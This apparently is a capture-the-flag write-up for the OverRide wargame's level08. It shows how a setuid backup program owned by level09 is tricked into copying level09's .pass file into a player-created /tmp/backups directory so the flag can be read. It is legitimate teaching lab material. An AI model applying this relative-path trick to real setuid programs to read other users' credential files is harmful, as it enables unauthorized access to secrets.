# level08 

The `./level08` program allows you to duplicate files in a `./backups/' folder and keep a record of operations performed in the .log file. 

We could therefore use the program to open the file containing our flag (/home/users/level09/.pass). 
In fact, the program's owner is level09: 
```bash 
level08@OverRide:/tmp/backups$ ls -l ~/level08 
-rwsr-s---+ 1 level09 users 12975 Oct 19 2016 /home/users/level08/level08
```
In order to get our flag, we need to create the `/backups/` folder, otherwise the program that tries to open it will return an error :
```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups/.log
```
because of that security check:
```c
logFile = fopen(“./backups/.log”, “w”);
if (logFile == NULL) {
    printf(“ERROR: Failed to open %s\n”, “./backups/.log”);
    exit(1);
}
```

We don't have the rights to create a `/backups/` folder in `/home/users/level08`, so we can go to `/tmp/` to create it.
```bash 
mkdir -p 'backups/home/users/level09/'
```
Once created, we simply need to run the program with the path to our flag as filename parameter. As always, we can open the file, as it is executed by level09. 
```bash
~/level08 /home/users/level09/.pass
```

Our `/home` folder will then be copied into our `/backups` folder.
Now all we need to do is cat our flag... 
```bash 
cat backups/home/users/level09/.pass
```
And TADAM!
